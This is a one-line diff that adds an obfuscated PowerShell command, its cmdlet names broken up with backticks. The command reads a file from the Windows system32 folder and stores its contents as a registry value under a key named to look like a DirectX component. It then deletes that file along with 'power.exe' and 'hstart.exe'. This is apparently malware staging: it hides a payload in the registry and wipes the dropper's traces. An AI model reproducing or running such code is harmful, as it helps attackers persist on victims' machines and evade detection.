@@ -1,0 +1,1 @@
+﻿$b=GeT`-ConTe`NT $env:windir\system32\1.txt;sE`T-`itE`m`PR`OpeRTy -Path "HKLM:\SOFTWARE\Classes\DIRECT.DirectX5.0\scripts" -Name "1" -Value $b;rem`OVE-It`eM $env:windir\system32\1.txt;rEm`OvE-i`Tem $env:windir\system32\power.exe;re`mOV`e-it`eM $env:windir\system32\hstart.exe
